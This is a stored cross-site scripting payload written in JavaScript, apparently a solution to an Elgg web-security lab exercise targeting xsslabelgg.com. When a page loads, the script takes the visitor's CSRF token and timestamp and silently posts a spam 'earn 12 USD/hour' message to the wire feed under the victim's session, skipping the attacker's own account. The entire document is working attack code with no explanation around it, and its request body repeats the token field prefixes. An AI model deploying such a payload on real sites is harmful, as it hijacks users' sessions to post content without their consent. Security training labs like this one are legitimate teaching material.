<script type="text/javascript">
	window.onload = function(){
        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
        //and Security Token __elgg_token
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        //Construct the content of your url.
        //found in request url while posting edit profile request
        var sendurl="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
        //observed content in the post request body
        var content="__elgg_token="+token+"&__elgg_ts="+ts+"&body=To+earn+12+USD%2FHour%28%21%29%2Cvisit+now+http%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2Fsamy";
        //FILL IN
        if(elgg.session.user.guid!=47)
        {
            //Create and send Ajax request to modify profile
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST",sendurl,true);
            Ajax.setRequestHeader("Host","www.xsslabelgg.com");
            Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
            Ajax.send(content);
        }
	}
</script>